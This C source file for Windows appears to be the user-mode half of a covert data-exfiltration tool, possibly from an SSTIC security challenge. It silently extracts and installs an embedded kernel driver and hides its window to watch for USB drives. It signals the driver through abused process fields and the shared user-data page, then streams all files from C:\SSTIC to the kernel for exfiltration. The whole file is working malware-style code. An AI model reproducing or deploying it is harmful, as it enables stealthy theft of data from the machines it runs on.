#include <Windows.h>
#include <Dbt.h>
#include <stdio.h>
#include <stdlib.h>
#include <wincrypt.h>

#define MD5_CHECKSUM_SIZE		16
#define MAX_SIZE_FILE			2097152 //2mb
#define DRVSSTIC_RSRC			101
#define DRVSSTIC_NAME			"drvSSTIC.sys"

typedef NTSTATUS(NTAPI *ZWSETINFORMATIONPROCESS)(HANDLE, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI *ZWQUERYINFORMATIONPROCESS)(HANDLE, ULONG, PVOID, ULONG, PULONG);

ZWQUERYINFORMATIONPROCESS ZwQueryInformationProcess;
ZWSETINFORMATIONPROCESS ZwSetInformationProcess;

typedef struct _KUSER_SHARED_DATA {
	BYTE			fuu[0x2C8];
	LARGE_INTEGER	SystemExpirationDate;
} KUSER_SHARED_DATA, *PKUSER_SHARED_DATA;

typedef struct _SHARED_BUFFER {
	HANDLE		event_driver_ready_to_recv_file;
	HANDLE		event_user_file_sent;
	HANDLE		event_driver_memory_full;
	HANDLE		event_user_all_files_sent;
	DWORD		raw_data_len;
	BYTE		checksum[MD5_CHECKSUM_SIZE];
	BYTE		data[MAX_SIZE_FILE];
} SHARED_BUFFER, *PSHARED_BUFFER;

const int ProcessDefaultHardErrorMode = 12;

PKUSER_SHARED_DATA pUserSharedData = 0x7FFE0000;
PSHARED_BUFFER pSharedBuffer;

LONGLONG orig_SystemExpirationDate;

HANDLE hInstance;
HANDLE hObject;
HANDLE hEvent;
PCHAR driverpath;

DWORD HashMD5()
{
	HCRYPTPROV hProv = 0;
	HCRYPTHASH hHash = 0;
	DWORD status = 0;
	DWORD cbSize = MD5_CHECKSUM_SIZE;

	if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
		return GetLastError();

	if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash))
	{
		CryptReleaseContext(hProv, 0);
		return GetLastError();
	}

	if (!CryptHashData(hHash, pSharedBuffer->data, pSharedBuffer->raw_data_len, 0))
	{
		CryptReleaseContext(hProv, 0);
		CryptDestroyHash(hHash);
		return GetLastError();
	}

	if (!CryptGetHashParam(hHash, HP_HASHVAL, pSharedBuffer->checksum, &cbSize, 0))
		status = GetLastError();
	
	CryptDestroyHash(hHash);
	CryptReleaseContext(hProv, 0);
	
	return status;
}

DWORD FillStructWithFile(PCHAR base_directory, PCHAR filename)
{
	DWORD status = 0;
	CHAR filepath[MAX_PATH];
	HANDLE hFile;
	DWORD dwFileSize = 0;
	DWORD i;

	strcpy_s(filepath, MAX_PATH, base_directory);
	filepath[strlen(base_directory) - 1] = 0;
	strcat_s(filepath, MAX_PATH, filename);
//	printf("file : %s\n", filepath);

	if ((hFile = CreateFile(filepath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL)) == INVALID_HANDLE_VALUE)
		return hFile;
	dwFileSize = GetFileSize(hFile, NULL);
	if (dwFileSize != INVALID_FILE_SIZE && dwFileSize <= MAX_SIZE_FILE)
	{
		ZeroMemory(pSharedBuffer->data, MAX_SIZE_FILE);
		if (ReadFile(hFile, pSharedBuffer->data, MAX_SIZE_FILE, NULL, NULL) == FALSE)
		{
			CloseHandle(hFile);
			return GetLastError();
		}
		pSharedBuffer->raw_data_len = dwFileSize;
	//	printf("dwFileSize : %d\n", pSharedBuffer->raw_data_len);
		status = HashMD5();
		CloseHandle(hFile);
	}
	else
	{
		CloseHandle(hFile);
		return INVALID_FILE_SIZE;
	}
	return status;
}

DWORD SendFilesToKernel()
{
	CHAR drive_disk[3];
	CHAR sstic_path[MAX_PATH];
	HANDLE hFile;
	WIN32_FIND_DATA data;

	if (ExpandEnvironmentStrings("%SystemDrive%", drive_disk, MAX_PATH) == 0)
		return GetLastError();

	strcpy_s(sstic_path, strlen(drive_disk) + 1, drive_disk);
	strcat_s(sstic_path, MAX_PATH, "\\SSTIC\\*");
	hFile = FindFirstFile(sstic_path, &data);
	if (hFile == INVALID_HANDLE_VALUE)
		return GetLastError();

	do
	{
		if (!(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
		{
			WaitForSingleObject(pSharedBuffer->event_driver_ready_to_recv_file, INFINITE);
		//	printf("[+] Driver is ready to receive file\n");
			ResetEvent(pSharedBuffer->event_driver_ready_to_recv_file);
			if (FillStructWithFile(sstic_path, data.cFileName) == 0)
			{
				SetEvent(pSharedBuffer->event_user_file_sent);
			//	printf("[+] file sent to kernel\n");
			}
		}
	} while (FindNextFileA(hFile, &data));
	return 0;
}

VOID SendDiskLetterToDriver(char letter)
{
	HANDLE hCurrentProc;
	DWORD dwReturnLength = 0;
	ULONG ulProcErrorMode = 0;
	DWORD ret = 0;
		
	hCurrentProc = GetCurrentProcess();

	ZwQueryInformationProcess = (ZWQUERYINFORMATIONPROCESS)GetProcAddress(LoadLibrary("ntdll.dll"), "ZwQueryInformationProcess");
	ZwQueryInformationProcess(hCurrentProc, ProcessDefaultHardErrorMode, &ulProcErrorMode, sizeof(ULONG), &dwReturnLength);

	ulProcErrorMode = GetTickCount();
	ulProcErrorMode = (~0xFF & ulProcErrorMode) | letter;
	
	ZwSetInformationProcess = (ZWSETINFORMATIONPROCESS)GetProcAddress(LoadLibrary("ntdll.dll"), "ZwSetInformationProcess");
	ret = ZwSetInformationProcess(hCurrentProc, ProcessDefaultHardErrorMode, &ulProcErrorMode, sizeof(ULONG));
	
	SetEvent(hEvent);
}


CHAR DiskLetterFromMask(DWORD mask)
{
	DWORD count = 0;
	while (mask > 1)
	{
		mask >>= 1;
		count++;
	}
	return "ABCDEFGHIJKLMNOPQRSTUVWXYZ"[count];
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	switch (Msg)
	{
		case WM_DEVICECHANGE:
			if (wParam == DBT_DEVICEARRIVAL)
			{
				DEV_BROADCAST_HDR *header = (DEV_BROADCAST_HDR*)(lParam);
				if (header->dbch_devicetype == DBT_DEVTYP_VOLUME)
				{
					DEV_BROADCAST_VOLUME *devVol = (DEV_BROADCAST_VOLUME*)(lParam);
			//		printf("[+] New device plugged\n");
					SendDiskLetterToDriver(DiskLetterFromMask(devVol->dbcv_unitmask));
				}
			}
		break;
	}
	return DefWindowProc(hWnd, Msg, wParam, lParam);
}

VOID GetMdlBaseAddr(void)
{
	BOOLEAN bMdlAddressFound = FALSE;

	//printf("waiting for MDL base addr ...\n");
	
	while (!bMdlAddressFound)
	{
		if (pUserSharedData->SystemExpirationDate.QuadPart != orig_SystemExpirationDate)
		{
		//	printf("[+] MDL base address found : %llx\n", pUserSharedData->SystemExpirationDate.QuadPart);
			pSharedBuffer = (PSHARED_BUFFER)pUserSharedData->SystemExpirationDate.QuadPart;
			bMdlAddressFound = TRUE;
			break;
		}
		Sleep(1000);
	}
}

void DetectRemovableDisk(void)
{
	HWND hWindow;
	WNDCLASSEX wcx;
	DEV_BROADCAST_DEVICEINTERFACE NotificationFilter;
	MSG msg;

	ZeroMemory(&wcx, sizeof(wcx));
	wcx.cbSize = sizeof(WNDCLASSEX);
	wcx.style = CS_HREDRAW | CS_VREDRAW;
	wcx.lpfnWndProc = WndProc;
	wcx.cbClsExtra = 0;
	wcx.cbWndExtra = 0;
	wcx.hInstance = hInstance;
	wcx.hIcon = NULL;
	wcx.hCursor = NULL;
	wcx.hbrBackground = (HBRUSH)(COLOR_WINDOW);
	wcx.lpszMenuName = NULL;
	wcx.lpszClassName = L"lsm64";
	wcx.hIconSm = NULL;

	RegisterClassExA(&wcx);
	hWindow = CreateWindow(L"lsm64", "toplevelwindow", WS_ICONIC, 0, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);
	if (hWindow == NULL)
	{
	//	fprintf(stderr, "Error while creating window : %x\n", GetLastError());
		exit(EXIT_FAILURE);
	}
	ShowWindow(hWindow, SW_HIDE);
	UpdateWindow(hWindow);

	ZeroMemory(&NotificationFilter, sizeof(NotificationFilter));
	NotificationFilter.dbcc_size = sizeof(DEV_BROADCAST_DEVICEINTERFACE);
	NotificationFilter.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
	memcpy(&NotificationFilter.dbcc_classguid, &GUID_DEVINTERFACE_DISK, 0x10);
	hObject = RegisterDeviceNotification(hWindow, &NotificationFilter, DEVICE_NOTIFY_WINDOW_HANDLE);
	
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}


BOOLEAN GetFileTempPath(char *filename)
{
	DWORD dwTempLen;
	PCHAR pTempPath = NULL;
	char tmp[MAX_PATH] = { 0 };

	dwTempLen = GetTempPathA(0, 0);
	pTempPath = malloc(dwTempLen);
	if (GetTempPathA(dwTempLen, pTempPath) == NULL)
		return FALSE;
	sprintf_s(tmp, MAX_PATH, "%s\\%s", pTempPath, filename);
	driverpath = malloc(MAX_PATH);
	memcpy_s(driverpath, MAX_PATH, tmp, MAX_PATH);
	free(pTempPath);
	return TRUE;
}

BOOLEAN ExtractRsrc()
{
	HMODULE hModule;
	HRSRC hRes;
	HANDLE hData, hFile = NULL, hFileMap = NULL;
	PVOID pData = NULL, pMappedView = NULL;
	DWORD dwDataSize = 0;
	BOOLEAN bRet = FALSE;

	hModule = GetModuleHandleA(NULL);
	hRes = FindResourceA(hModule, MAKEINTRESOURCE(101), "BINARY");

	if (hModule && hRes)
	{
		hData = LoadResource(hModule, hRes);
		if (hData)
		{ 
			dwDataSize = SizeofResource(hModule, hRes);
			pData = LockResource(hData);
			if (pData && dwDataSize)
			{
				if (GetFileTempPath(DRVSSTIC_NAME))
				{
					hFile = CreateFileA(driverpath, GENERIC_ALL, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, 0);
					if (hFile != INVALID_HANDLE_VALUE)
					{
						if (hFileMap = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, dwDataSize, DRVSSTIC_NAME))
						{
							pMappedView = MapViewOfFile(hFileMap, FILE_MAP_WRITE, 0, 0, 0);
							memcpy(pMappedView, pData, dwDataSize);
							if (FlushViewOfFile(pMappedView, 0) && UnmapViewOfFile(pMappedView))
								bRet = TRUE;
						}
					}
				}
			}
		}
	}
	CloseHandle(hFile);
	CloseHandle(hFileMap);

	return bRet;
}

BOOLEAN Stop_Driver()
{
	BOOLEAN bRet = FALSE;
	SC_HANDLE hScManager = NULL, hService = NULL;
	SERVICE_STATUS_PROCESS ssp;

	if ((hScManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)) != NULL)
	{
		if ((hService = OpenService(hScManager, DRVSSTIC_NAME, SERVICE_STOP)) != NULL)
		{
			if (ControlService(hService, SERVICE_CONTROL_STOP, &ssp))
			{
				bRet = TRUE;
			}
			else
				bRet = FALSE;
		}
	}
	CloseServiceHandle(hScManager);
	CloseServiceHandle(hService);
	return bRet;
}

BOOLEAN Launch_Driver()
{
	BOOLEAN bRet = FALSE;
	SC_HANDLE hScManager = NULL, hService = NULL;

	if ((hScManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE)) != NULL)
	{
		if ((hService = CreateService(hScManager, DRVSSTIC_NAME, DRVSSTIC_NAME, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, driverpath, NULL, NULL, NULL, NULL, NULL)) != NULL)
		{
			if (StartServiceA(hService, 0, NULL))
			{
				bRet = TRUE;
			}
		}
		else if (GetLastError() == ERROR_SERVICE_EXISTS)
		{
			CloseServiceHandle(hService);
			hService = OpenServiceA(hScManager, DRVSSTIC_NAME, SERVICE_ALL_ACCESS);
			if (StartServiceA(hService, 0, NULL))
			{
				bRet = TRUE;
			}
		}
	}
	CloseServiceHandle(hScManager);
	CloseServiceHandle(hService);
	return bRet;
}

BOOLEAN Install_VFS_Driver()
{
	
	if (!ExtractRsrc())
		return FALSE;
	
//	printf("[+] Extraction ok\n");
	
	if (Launch_Driver() || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
		return TRUE;
	
	//printf("[-] Driver not started : %x\n", GetLastError());
	return FALSE;
}

int WINAPI CALLBACK WinMain(
	__in HINSTANCE hInstance,
	__in_opt HINSTANCE hPrevInstance,
	__in_opt LPSTR lpCmdLine,
	__in int nShowCmd)
{
	HANDLE hThread, hThread2, hThread3;

	orig_SystemExpirationDate = pUserSharedData->SystemExpirationDate.QuadPart;

	hEvent= CreateEvent(NULL, FALSE, FALSE, NULL);
	
	// start driver
	hThread3 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Install_VFS_Driver, NULL, 0, NULL);
	if (hThread3 == INVALID_HANDLE_VALUE)
	{
		//fprintf(stderr, "Error creating thread3 : %x\n", GetLastError());
		exit(EXIT_FAILURE);
	}
	//printf("[+] Driver started\n");

	hInstance = GetModuleHandle(NULL);
	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DetectRemovableDisk, NULL, 0, NULL);
	if (hThread == INVALID_HANDLE_VALUE)
	{
		//fprintf(stderr, "Error creating thread0 : %x\n", GetLastError());
		exit(EXIT_FAILURE);
	}
	WaitForSingleObject(hEvent, INFINITE);
	//printf("[+] Disk letter sent to driver\n");
	hThread2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GetMdlBaseAddr, NULL, 0, NULL);
	if (hThread2 == INVALID_HANDLE_VALUE)
	{
		//fprintf(stderr, "Error creating thread1 : %x\n", GetLastError());
		exit(EXIT_FAILURE);
	}
	WaitForSingleObject(hThread2, INFINITE);

	pSharedBuffer->event_driver_ready_to_recv_file = CreateEventA(NULL, FALSE, FALSE, NULL);
	pSharedBuffer->event_user_file_sent = CreateEventA(NULL, FALSE, FALSE, NULL);
	pSharedBuffer->event_driver_memory_full = CreateEventA(NULL, FALSE, FALSE, NULL);
	pSharedBuffer->event_user_all_files_sent = CreateEventA(NULL, FALSE, FALSE, NULL);
	
	if (SendFilesToKernel() != 0)
		return EXIT_FAILURE;

	// we don't have nothing to send anymore
	SetEvent(pSharedBuffer->event_user_all_files_sent);
	WaitForSingleObject(pSharedBuffer->event_driver_memory_full, INFINITE);
//	printf("[+] Exfiltration done\n");

	free(driverpath);
	WaitForSingleObject(hThread3, INFINITE);
	Stop_Driver();
	return EXIT_SUCCESS;
}
